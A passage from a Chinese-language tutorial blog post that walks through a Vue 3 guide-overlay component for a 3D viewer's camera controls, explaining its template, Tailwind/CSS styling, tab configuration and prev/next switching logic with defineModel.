    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-content"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-tips"</span>&gt;</span>{{ guideTips }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-img-wrapper"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-arrow-icon"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handlePrev"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">ArrowLeftIcon</span> <span class="hljs-attr">:width</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">:height</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"#FFFFFF"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"guideImg"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-img"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-arrow-icon"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleNext"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">GuideArrowRight</span> <span class="hljs-attr">:width</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">:height</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"#FFFFFF"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"confim-btn"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleConfirm"</span>&gt;</span>知道了<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>组件结构概要：</p>
<pre><code class="hljs language-bash" lang="bash">guide-container (整个遮罩层)
 ├ guide-container-header （顶部三组 tab）
 │   ├ guide-container-tabs（移动视角）
 │   │   ├ header
 │   │   └ content -&gt; item
 │   ├ line
 │   ├ guide-container-tabs（旋转视角）
 │   ├ line
 │   ├ guide-container-tabs-last（缩放视角）
 │
 ├ guide-container-content（下半部分）
 │   ├ guide-tips（提示文字）
 │   ├ guide-img-wrapper（左右箭头 + 图片）
 │   ├ confirm-btn（底部按钮）
</code></pre>
<p>部分代码分析：</p>
<pre><code class="hljs language-css" lang="css">:class=<span class="hljs-string">"[
  'guide-container-tabs-content-item',
  activeTab === item.value ? 'tab-active' : '',
]"</span>
</code></pre>
<p>这是Vue 的动态 class 数组写法</p>
<p>上述代码的含义是</p>
<ul>
<li>无论如何都加上 "guide-container-tabs-content-item"</li>
<li>如果当前项是选中项 → 加上 "tab-active"</li>
<li>如果不是选中项 → 加上空字符串（不会渲染）</li>
</ul>
<p>Index.vue中：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">Guide</span> <span class="hljs-attr">v-model:is-show</span>=<span class="hljs-string">"isShowGuide"</span> /&gt;</span>
</code></pre>
<h3 data-id="heading-5">3.2 css样式</h3>
<p>Guide.vue 中：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container</span> {
  <span class="hljs-keyword">@apply</span> flex flex-col absolute bottom-[<span class="hljs-number">26px</span>] right-[<span class="hljs-number">32px</span>] z-<span class="hljs-number">50</span> bg-[#<span class="hljs-number">00000099</span>] rounded-[<span class="hljs-number">10px</span>] overflow-hidden;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">800px</span>;
}

<span class="hljs-selector-class">.guide-container-header</span> {
  <span class="hljs-keyword">@apply</span> flex gap-[<span class="hljs-number">32px</span>] bg-[#<span class="hljs-number">1</span>E2128] px-[<span class="hljs-number">40px</span>] pt-[<span class="hljs-number">16px</span>] pb-[<span class="hljs-number">8px</span>] box-border text-[#<span class="hljs-number">88909</span>B] h-[<span class="hljs-number">72px</span>];
}

<span class="hljs-selector-class">.guide-container-tabs</span> {
  <span class="hljs-keyword">@apply</span> flex gap-[<span class="hljs-number">24px</span>] items-center h-[<span class="hljs-number">28px</span>];
}

<span class="hljs-selector-class">.guide-container-tabs-last</span> {
  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
  <span class="hljs-attribute">position</span>: relative;
}

<span class="hljs-selector-class">.guide-container-tabs-last</span> <span class="hljs-selector-class">.guide-container-tabs-header</span> {
  <span class="hljs-attribute">display</span>: none;
}

<span class="hljs-selector-class">.guide-container-tabs-last</span> <span class="hljs-selector-class">.guide-container-tabs-content</span> {
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);
}

<span class="hljs-selector-class">.guide-container-tabs-line</span> {
  <span class="hljs-keyword">@apply</span> w-[<span class="hljs-number">1px</span>] h-[<span class="hljs-number">16px</span>] mx-[<span class="hljs-number">9.5px</span>] my-[<span class="hljs-number">6px</span>] bg-[#<span class="hljs-number">505968</span>];
}

<span class="hljs-selector-class">.guide-container-tabs-header</span> {
  <span class="hljs-keyword">@apply</span> text-[<span class="hljs-number">20px</span>];
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#4884FD</span>;
}

<span class="hljs-selector-class">.guide-container-tabs-content</span> {
  <span class="hljs-keyword">@apply</span> text-[<span class="hljs-number">16px</span>] flex gap-[<span class="hljs-number">24px</span>] h-[<span class="hljs-number">28px</span>] items-center;
}

<span class="hljs-selector-class">.guide-container-tabs-content-item</span> {
  <span class="hljs-keyword">@apply</span> cursor-pointer <span class="hljs-attribute">hover</span>:text-[#FFFFFF];
  <span class="hljs-attribute">white-space</span>: nowrap;
}

<span class="hljs-selector-class">.tab-active</span> {
  <span class="hljs-keyword">@apply</span> text-[#FFFFFF] relative;
}

<span class="hljs-selector-class">.tab-active</span><span class="hljs-selector-pseudo">::before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">''</span>;
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">bottom</span>: -<span class="hljs-number">16.75px</span>;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">6.25px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">6.25px</span> solid transparent;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">7.5px</span> solid <span class="hljs-number">#2061fd</span>;
}

<span class="hljs-selector-class">.guide-container-content</span> {
  <span class="hljs-keyword">@apply</span> p-[<span class="hljs-number">32px</span>] box-border;
}

<span class="hljs-selector-class">.guide-tips</span> {
  <span class="hljs-keyword">@apply</span> text-[#FFFFFF] text-[<span class="hljs-number">20px</span>] mb-[<span class="hljs-number">32px</span>] text-center;
  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">0.02em</span>;
}

<span class="hljs-selector-class">.guide-img-wrapper</span> {
  <span class="hljs-keyword">@apply</span> relative flex items-center justify-center mb-[<span class="hljs-number">48px</span>] px-[<span class="hljs-number">56px</span>];
}

<span class="hljs-selector-class">.guide-arrow-icon</span> {
  <span class="hljs-keyword">@apply</span> absolute top-<span class="hljs-number">1</span>/<span class="hljs-number">2</span> -translate-y-<span class="hljs-number">1</span>/<span class="hljs-number">2</span> flex items-center justify-center cursor-pointer;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">44px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">44px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#FFFFFF26</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">37px</span>;
}

<span class="hljs-selector-class">.guide-arrow-icon</span><span class="hljs-selector-pseudo">:first</span>-child {
  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
}

<span class="hljs-selector-class">.guide-arrow-icon</span><span class="hljs-selector-pseudo">:last-child</span> {
  <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;
}

<span class="hljs-selector-class">.guide-img</span> {
  <span class="hljs-attribute">height</span>: <span class="hljs-number">210px</span>;
  <span class="hljs-attribute">max-width</span>: <span class="hljs-number">580px</span>;
  <span class="hljs-attribute">width</span>: auto;
  <span class="hljs-attribute">object-fit</span>: contain;
}

<span class="hljs-selector-class">.confim-btn</span> {
  <span class="hljs-keyword">@apply</span> w-[<span class="hljs-number">156px</span>] h-[<span class="hljs-number">48px</span>] bg-[#<span class="hljs-number">216</span>BFF] text-[#FFFFFF] text-[<span class="hljs-number">18px</span>] rounded-[<span class="hljs-number">6px</span>] text-center cursor-pointer flex items-center justify-center mx-auto;
  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">0.02em</span>;
}
</code></pre>
<p>css分析：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container</span> {
  <span class="hljs-keyword">@apply</span> flex flex-col absolute bottom-[<span class="hljs-number">26px</span>] right-[<span class="hljs-number">32px</span>] z-<span class="hljs-number">50</span> bg-[#<span class="hljs-number">00000099</span>] rounded-[<span class="hljs-number">10px</span>] overflow-hidden;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">800px</span>;
}
</code></pre>
<p>flex flex-col相当于display: flex; flex-direction: column;</p>
<blockquote>
<p>flex布局，文字方向是纵向，也就是垂直排列</p>
</blockquote>
<p>absolute：让这个容器变成 绝对定位。</p>
<blockquote>
<p>相对于最近的 position: relative 的祖先元素</p>
<p>如果没有，则相对于 浏览器视口（viewport）</p>
</blockquote>
<p>bottom-[26px] right-[32px]</p>
<blockquote>
<p>让这个容器固定在右下角，离底部 26px，离右侧 32px。</p>
</blockquote>
<p>z-index: 50;</p>
<blockquote>
<p>让它 叠在几乎所有元素之上</p>
<p>防止被页面其他内容遮住。</p>
</blockquote>
<p>bg-[#00000099]</p>
<blockquote>
<p>#00000099
#000000 = 黑色
99 = 透明度 (~60%)</p>
<p>这是一个半透明黑色的背景 -&gt; 类似“深色面板”</p>
</blockquote>
<p>rounded-[10px]</p>
<blockquote>
<p>rounded-[10px]</p>
</blockquote>
<p>overflow-hidden</p>
<blockquote>
<p>让内部内容裁剪，不会溢出容器外。</p>
</blockquote>
<p>width: 800px;</p>
<blockquote>
<p>固定宽度为 800px。</p>
<p>这让弹窗有固定的大宽度，适合显示图片 + 文案。</p>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container-header</span> {
  <span class="hljs-keyword">@apply</span> flex gap-[<span class="hljs-number">32px</span>] bg-[#<span class="hljs-number">1</span>E2128] px-[<span class="hljs-number">40px</span>] pt-[<span class="hljs-number">16px</span>] pb-[<span class="hljs-number">8px</span>] box-border text-[#<span class="hljs-number">88909</span>B] h-[<span class="hljs-number">72px</span>];
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28ecdbf0c04b43dc93551bdd0eaf3b97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=f0YmyH3oWZo6HULuVgbUor%2FUJho%3D" alt="image-20251204161333501" loading="lazy"/></p>
<p>flex gap-[32px] bg-[#1E2128]</p>
<blockquote>
<p>flex布局默认横向排列  设置深灰背景色</p>
<p>gap 只会在兄弟元素之间产生空间32px</p>
<p>[移动视角 tabs]   [竖线]   [旋转视角 tabs]   [竖线]   [缩放视角 tabs]</p>
</blockquote>
<p>px-[40px] pt-[16px] pb-[8px]</p>
<blockquote>
<p>px是左右 的padding-left: 40px;padding-right: 40px;</p>
<p>pt是padding-top: 16px; pb是padding-bottom: 8px;</p>
<p>| ← padding-left 40px → | A | gap 32 | B | gap 32 | C | ← padding-right 40px → |</p>
</blockquote>
<p>box-border</p>
<blockquote>
<p>box-sizing: border-box; padding 和 border 会包含在 height 内部</p>
<p>设定 h-[72px] 时不会撑大元素</p>
</blockquote>
<p>h-[72px]</p>
<blockquote>
<p>高度固定为 72px。</p>
</blockquote>
<p>为什么视觉上，文字下部的空隙要大？</p>
<blockquote>
<p>因为头部固定了高度，上下padding定死了，文字会贴着上padding，所以显得下面大</p>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container-tabs</span> {
  <span class="hljs-keyword">@apply</span> flex gap-[<span class="hljs-number">24px</span>] items-center h-[<span class="hljs-number">28px</span>];
}
</code></pre>
<blockquote>
<p>元素间距24px，items-center 表示垂直方向上居中</p>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container-tabs-line</span> {
  <span class="hljs-keyword">@apply</span> w-[<span class="hljs-number">1px</span>] h-[<span class="hljs-number">16px</span>] mx-[<span class="hljs-number">9.5px</span>] my-[<span class="hljs-number">6px</span>] bg-[#<span class="hljs-number">505968</span>];
}
</code></pre>
<p>定好的分割线</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container-tabs-last</span> {
  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
  <span class="hljs-attribute">position</span>: relative;
}

<span class="hljs-selector-class">.guide-container-tabs-last</span> <span class="hljs-selector-class">.guide-container-tabs-header</span> {
  <span class="hljs-attribute">display</span>: none;
}

<span class="hljs-selector-class">.guide-container-tabs-last</span> <span class="hljs-selector-class">.guide-container-tabs-content</span> {
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);
}
</code></pre>
<blockquote>
<p>最后一个tab样式和之前的不太同</p>
<p>所以flex: 1，让他占据剩下的所有空间， position: relative;，为他的子元素绝对定位用</p>
<p>display: none;消除guide-container-tabs-header本身的影响</p>
<p>position: absolute; left: 50%;transform: translateX(-50%); 水平方向居中三件套</p>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container-tabs-content</span> {
  <span class="hljs-keyword">@apply</span> text-[<span class="hljs-number">16px</span>] flex gap-[<span class="hljs-number">24px</span>] h-[<span class="hljs-number">28px</span>] items-center;
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26d88064e76a44218895cb7242b516bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=WCfwl3Q52u3N5sXyc1ZkrQWVCPM%3D" alt="image-20251204161601272" loading="lazy"/></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.tab-active</span><span class="hljs-selector-pseudo">::before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">''</span>;
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">bottom</span>: -<span class="hljs-number">16.75px</span>;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">6.25px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">6.25px</span> solid transparent;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">7.5px</span> solid <span class="hljs-number">#2061fd</span>;
}
</code></pre>
<p>纯css三角形技巧，tab项下面的三角形</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container-content</span> {
  <span class="hljs-keyword">@apply</span> p-[<span class="hljs-number">32px</span>] box-border;
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/029846d77c4b43d19480d7e35f3105e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=rkD%2BTfF1U3LuBwDbDB0zdG292OQ%3D" alt="image-20251204153235284" loading="lazy"/></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-tips</span> {
  <span class="hljs-keyword">@apply</span> text-[#FFFFFF] text-[<span class="hljs-number">20px</span>] mb-[<span class="hljs-number">32px</span>] text-center;
  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">0.02em</span>;
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1908d2dd6b674d479d2d6fbc53326dfd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=VtQLpok7oQ%2F8Yi%2F%2FQ%2BQbw7DmG20%3D" alt="image-20251204154318130" loading="lazy"/></p>
<blockquote>
<p>在视觉上，看着可能要大一些，因为本身的图片就有一段空白高度</p>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-img-wrapper</span> {
  <span class="hljs-keyword">@apply</span> relative flex items-center justify-center mb-[<span class="hljs-number">48px</span>] px-[<span class="hljs-number">56px</span>];
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04116d84b1794b48bf110137ee5a95dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=ZkRZepAOm4WAXONPZUJJhdxXDGY%3D" alt="image-20251204155110774" loading="lazy"/></p>
<p>其中紫色部分是图片并没有被拉满 wrapper，object-fit: contain 自动填的空白</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-img</span> {
  <span class="hljs-attribute">height</span>: <span class="hljs-number">210px</span>;
  <span class="hljs-attribute">max-width</span>: <span class="hljs-number">580px</span>;
  <span class="hljs-attribute">width</span>: auto;
  <span class="hljs-attribute">object-fit</span>: contain;
}
</code></pre>
<blockquote>
<p>width: auto 宽度跟着图片本身比例自适应</p>
<p>object-fit: contain; —— 图片保持原比例，不能被裁剪,保持原始比例，宁愿留白，也不能拉伸和裁剪</p>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-arrow-icon</span> {
  <span class="hljs-keyword">@apply</span> absolute top-<span class="hljs-number">1</span>/<span class="hljs-number">2</span> -translate-y-<span class="hljs-number">1</span>/<span class="hljs-number">2</span> flex items-center justify-center cursor-pointer;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">44px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">44px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#FFFFFF26</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">37px</span>;
}

<span class="hljs-selector-class">.guide-arrow-icon</span><span class="hljs-selector-pseudo">:first</span>-child {
  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
}

<span class="hljs-selector-class">.guide-arrow-icon</span><span class="hljs-selector-pseudo">:last-child</span> {
  <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d130291aeb84b7d87822b88d4ae72b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=x%2B3Qmr7dV4BLCUKNz6i3fA6ooz4%3D" alt="image-20251204160627685" loading="lazy"/></p>
<blockquote>
<p>内部垂直水平居中</p>
<p>外部左右间距设置为0，紧贴</p>
</blockquote>
<h3 data-id="heading-6">3.2 JS交互</h3>
<p>settings.ts配置</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">GuideMoveTabConfig</span> = [
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'前后'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-string">'move-forward-backward'</span>,
    <span class="hljs-attr">img</span>: <span class="hljs-title class_">MoveForwardBackwardImg</span>,
    <span class="hljs-attr">info</span>: <span class="hljs-string">'键盘W/S键 或 按住鼠标滚轮上下滚动'</span>,
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'左右'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-string">'move-left-right'</span>,
    <span class="hljs-attr">img</span>: <span class="hljs-title class_">MoveLeftRightImg</span>,
    <span class="hljs-attr">info</span>: <span class="hljs-string">'键盘A/D键 或 按住鼠标右键左右拖动'</span>,
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'上下'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-string">'move-up-down'</span>,
    <span class="hljs-attr">img</span>: <span class="hljs-title class_">MoveUpDownImg</span>,
    <span class="hljs-attr">info</span>: <span class="hljs-string">'按住鼠标右键上下拖动'</span>,
  },
]

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">GuideRotateTabConfig</span> = [
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'俯仰/航向'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-string">'rotate-pitch'</span>,
    <span class="hljs-attr">img</span>: <span class="hljs-title class_">RotatePitchImg</span>,
    <span class="hljs-attr">info</span>: <span class="hljs-string">'按住鼠标左键拖动'</span>,
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'横滚'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-string">'rotate-roll'</span>,
    <span class="hljs-attr">img</span>: <span class="hljs-title class_">RotateRollImg</span>,
    <span class="hljs-attr">info</span>: <span class="hljs-string">'键盘Q/E键'</span>,
  },
]

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">GuideScaleTabConfig</span> = [
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'聚集环绕'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-string">'scale'</span>,
    <span class="hljs-attr">img</span>: <span class="hljs-title class_">ScaleImg</span>,
    <span class="hljs-attr">info</span>: <span class="hljs-string">'鼠标左键双击，聚集目标点环绕查看'</span>,
  },
]
</code></pre>
<p>Guide.vue 中的 JS 交互</p>
<pre><code class="hljs language-javascript" lang="javascript">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { ref, computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">GuideMoveTabConfig</span>, <span class="hljs-title class_">GuideRotateTabConfig</span>, <span class="hljs-title class_">GuideScaleTabConfig</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'../settings'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ArrowLeftIcon</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/assets/svgs/ArrowLeftIcon.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">GuideArrowRight</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/assets/svgs/GuideArrowRight.vue'</span>

<span class="hljs-keyword">const</span> <span class="hljs-title class_">AllConfig</span> = [...<span class="hljs-title class_">GuideMoveTabConfig</span>, ...<span class="hljs-title class_">GuideRotateTabConfig</span>, ...<span class="hljs-title class_">GuideScaleTabConfig</span>]

<span class="hljs-keyword">const</span> isShow = defineModel&lt;boolean&gt;(<span class="hljs-string">'isShow'</span>, {
  <span class="hljs-attr">type</span>: <span class="hljs-title class_">Boolean</span>,
  <span class="hljs-attr">default</span>: <span class="hljs-literal">false</span>,
})

<span class="hljs-keyword">const</span> activeTab = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'move-forward-backward'</span>)
<span class="hljs-keyword">const</span> currentConfig = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">AllConfig</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">value</span> === activeTab.<span class="hljs-property">value</span>)
})
<span class="hljs-keyword">const</span> guideTips = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> currentConfig.<span class="hljs-property">value</span>?.<span class="hljs-property">info</span>
})
<span class="hljs-keyword">const</span> guideImg = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> currentConfig.<span class="hljs-property">value</span>?.<span class="hljs-property">img</span>
})

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleTabClick</span> = (<span class="hljs-params">tab: string</span>) =&gt; {
  activeTab.<span class="hljs-property">value</span> = tab
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePrev</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> currentIndex = <span class="hljs-title class_">AllConfig</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">value</span> === activeTab.<span class="hljs-property">value</span>)
  <span class="hljs-keyword">if</span> (currentIndex === -<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span>
  <span class="hljs-keyword">const</span> prevIndex = (currentIndex - <span class="hljs-number">1</span> + <span class="hljs-title class_">AllConfig</span>.<span class="hljs-property">length</span>) % <span class="hljs-title class_">AllConfig</span>.<span class="hljs-property">length</span>
  <span class="hljs-keyword">const</span> prevConfig = <span class="hljs-title class_">AllConfig</span>[prevIndex]
  <span class="hljs-keyword">if</span> (prevConfig) {
    activeTab.<span class="hljs-property">value</span> = prevConfig.<span class="hljs-property">value</span>
  }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNext</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> currentIndex = <span class="hljs-title class_">AllConfig</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">value</span> === activeTab.<span class="hljs-property">value</span>)
  <span class="hljs-keyword">if</span> (currentIndex === -<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span>
  <span class="hljs-keyword">const</span> nextIndex = (currentIndex + <span class="hljs-number">1</span>) % <span class="hljs-title class_">AllConfig</span>.<span class="hljs-property">length</span>
  <span class="hljs-keyword">const</span> nextConfig = <span class="hljs-title class_">AllConfig</span>[nextIndex]
  <span class="hljs-keyword">if</span> (nextConfig) {
    activeTab.<span class="hljs-property">value</span> = nextConfig.<span class="hljs-property">value</span>
  }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleConfirm</span> = (<span class="hljs-params"/>) =&gt; {
  isShow.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
}
&lt;/script&gt;
</code></pre>
<p><strong>1.从 settings 里面拿到三个 tab 的配置</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">AllConfig</span> = [...<span class="hljs-title class_">GuideMoveTabConfig</span>, ...<span class="hljs-title class_">GuideRotateTabConfig</span>, ...<span class="hljs-title class_">GuideScaleTabConfig</span>]
</code></pre>
<p><strong>2.解构拼接成一个大数组</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> isShow = defineModel&lt;boolean&gt;(<span class="hljs-string">'isShow'</span>, {
  <span class="hljs-attr">type</span>: <span class="hljs-title class_">Boolean</span>,
  <span class="hljs-attr">default</span>: <span class="hljs-literal">false</span>,
})
</code></pre>
<p>defineModel的用途</p>
<ul>
<li>声明一个“模型字段”（用于 v-model 绑定）</li>
<li>自动生成 props + emits</li>
<li>返回一个 ref（可直接修改，自动触发父组件更新）</li>
</ul>
<blockquote>
<p>boolean（泛型）</p>
<p>defineModel&lt;boolean&gt;,这个 model 的类型是 boolean</p>
<p>isShow.value 必须是 boolean,父组件传进来的数据也必须是 boolean</p>
